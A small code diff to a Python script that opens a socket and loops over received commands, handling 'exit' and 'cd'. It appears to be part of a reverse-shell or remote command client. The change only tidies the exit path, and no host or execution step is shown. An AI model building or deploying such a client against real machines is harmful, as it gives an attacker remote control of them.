@@ -2,7 +2,6 @@ import socket
 import os
 import subprocess
 import sys
-import time
 
 s = socket.socket()
 
@@ -15,7 +14,7 @@ while True:
     data = s.recv(1024)
 
     if(data.decode("utf-8") == "exit"):
-        time.sleep(2)
+        s.close()
         sys.exit()
 
     if(data[:2].decode("utf-8") == "cd"):
